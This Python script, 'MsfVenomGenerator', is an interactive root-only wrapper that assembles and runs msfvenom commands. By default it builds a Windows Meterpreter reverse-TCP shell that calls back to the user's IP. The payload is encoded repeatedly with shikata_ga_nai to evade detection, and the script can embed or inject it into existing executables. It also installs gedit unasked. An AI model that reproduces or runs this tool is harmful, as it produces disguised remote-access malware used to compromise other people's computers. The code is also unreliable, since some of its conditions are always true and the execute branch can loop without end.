#-*- coding: utf-8 -*-

from time import sleep


class col:
    head = '\033[95m'
    blue = '\033[94m'
    green = '\033[92m'
    warn = '\033[93m'
    fail = '\033[91m'
    none = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'
import os
import sys
import urllib.request
import getpass
os.system("apt-get install gedit")
os.system("clear")
print(" " + col.head)
if os.getuid() != 0:
    exit("This tool must be executed as Root")
print("                                                                   __     _______ _   _  ___  __  __ ")
print("                                                                   \ \   / / ____| \ | |/ _ \|  \/  |")
print("                                                                    \ \ / /|  _| |  \| | | | | |\/| |")
print("                                                                     \ V / | |___| |\  | |_| | |  | |")
print("                                                                      "+ col.underline + "\_/  |_____|_| \_|\___/|_|  |_|")
print(" " +col.none)
print(" ")
print(" ")
print(col.blue + "MsfVenomGenerator by" + col.warn + " DasPinguinHD")
print(" ")
print("PRO-TIP: You can edit the badchars.txt file to personalize your Payload" + col.none)
print(" ")
print(" ")
print(" ")
input("Press enter to start")
os.system("clear")


try:
    print("Let's set your IP-Address. You'll most likely be using this tool in a local network, so you'll need your local IP-Address. If you want to see your local IP, type 'show IP' ")
    while True:
        lhost = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
        if lhost == "show IP":
            l3 = col.warn + "IP" + col.none + "config"
            for x in l3:
                print(x, end='')
                sys.stdout.flush()
                sleep(0.1)
            sleep(1.5)
            os.system("ifconfig")
            print("Your Wifi-Interface might be called something like wlan0 or wlan1. You'll need the inet: XXX.XXX.XX.XXX. If you don't see a WiFi-Interface, you might have a cable connection or simply no internet")
        elif lhost == "":
            print("Please enter a valid IP")
        else:
            break

    print("Now set your port. If you press enter, it'll be 4444")

    while True:
        lport= input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
        if lport == "":
            lport = "4444"
            break

        else:
            try:
                val1 = int(lport)
                print("Success")
                break
            except ValueError:
                print("Wrong input")


    print("Your port has been set.")
    print("Now you'll need a payload. If you want a list of available payloads, type 'show payloads'. Or just simply enter your payload . If you press enter, your Payload will be: windows/meterpreter/reverse_tcp.")
    while True:
        print("Payload:")
        payload = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
        if payload == "show payloads":
            l0 = "Loading " + col.warn + "Payloads"+col.none  + ", this might take a while..."
            for x in l0:
                print(x, end='')
                sys.stdout.flush()
                sleep(0.1)
            os.system("msfvenom --list payloads")

        elif payload == "":
            print("payload set: windows/meterpreter/reverse_tcp.")
            payload = "windows/meterpreter/reverse_tcp"
            break
        else:
            print("Done")
            break


    print("Your payload has been registered")

    print("Now it's time to encode your payload: ")

    print("show encoders will show you a list of enocoders. If you press enter, it'll be set to x86/shikata_ga_nai. ")
    while True:
        encoder = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
        if encoder == "":
            encoder = "x86/shikata_ga_nai"
            print("Encoder: " + str(encoder))
            break
        elif encoder == "show encoders":
            l2 = "Loading "+ col.warn +  "Encoders" + col.none + ", this might take a while..."
            for x in l2:
                print(x, end='')
                sys.stdout.flush()
                sleep(0.1)
            os.system("msfvenom --list encoders")
        else:
            print("Encoder set")
            break

    print("Now enter how many times your payload should be encoded (Iterations). If you press enter, you'll have 4 Itertions. ")
    iteration = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
    if iteration == "":
        iteration = "4"
    else:
        print("Iterations set")
    while True:
        print("Now enter how many Bad-Chars you want, type 'edit' to edit the file and customize your badchars file: ")
        print("1,2,3,4; edit")
        bchar = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
        if bchar == "1":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + "'"
            break
        if bchar == "2":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + "'"
            break
        if bchar == "3":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + str(currentline[2]) + "'"
            break
        if bchar == "4":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + str(currentline[2]) + str(currentline[3]) + "'"
            break
        if bchar == "edit":
            l4 = col.warn + "G" + col.none + "edit"
            for x in l4:
                print(x, end='')
                sys.stdout.flush()
                sleep(0.1)
            sleep(1)
            os.system("gedit badchars.txt")

    print("Your bad chars: " + str(badchar))

    print("Now enter o, x or k, to set the 'Mode' of the output file: ")
    while True:
        file = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
        if file == "o":
            x = "-o"
            print("Normal-Out")
            print(" ")
            print("Now enter a path, beginning at / (/home/USERNAME/FILENAME e. g.) Don't enter the suffix (exe, txt e. g.): ")
            template = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
            print("Now enter a suffix, which matches to your target Payload and/or OS (e. g.: exe oder txt on Windows) (ENTER WITHOUT THE DOT! Don't enter .exe, rather enter exe): ")
            suffix = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
            break
        if file == "x":
            x = "-x"
            print("Template as Output")
            print("Enter an executable file as template. Start at the root directory '/'. For example if your template is here: enter this: /home/USERNAME/template.exe")
            template = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
            print("Now enter a Name for your output (Such as: /home/USER/test1) (without the suffix): ")
            output1 = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
            print("Now enter the suffix (such as exe or txt e. g.)")
            output2 = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")

            break
        if file == "k":
            x = "-k"
            print("Code-Injection into an existing file")
            print(" ")
            print("Enter the path to the file, but don't enter the suffix of the file (like exe). Start from the root directory '/' ")
            template = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
            print("Now enter the suffix of your file ")
            suffix = input(col.underline + col.blue + "MSFVenom-Generator" + col.none + " >>> ")
            break

        if file != "o" or "x" or "k":
            print("Wrong input!")
    print("Done, generating code...")

    outcmd = input("Do you want to execute the command now or just show it? (E/s): ")
    while True:
        if outcmd == "E":
            if file == "x":
                msfcode = "msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
                print("Executing... " + str(msfcode))
                os.system(str(msfcode))
                break
            elif file == "o" or "k":
                print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                os.system("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
            else:
                print("Wrong input, try again!")
                break

        elif outcmd == "s":
            try:
                if file == "x":
                    print("Your code: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
                    break
                elif file == "o":
                    print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                    break
                elif file == "k":
                    print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                    break
                else:
                    print(col.warn + "invalid input, try again." + col.none)



            except Exception as e:
                print(str(e) + "Procceding anyway...")
            print("Happy hacking! (^_^)")
except KeyboardInterrupt:
    print(" ")
    print(col.warn + "Shutdown... Goodbye" + col.none)
except Exception as e:
    print("An error occured:" + str(e))
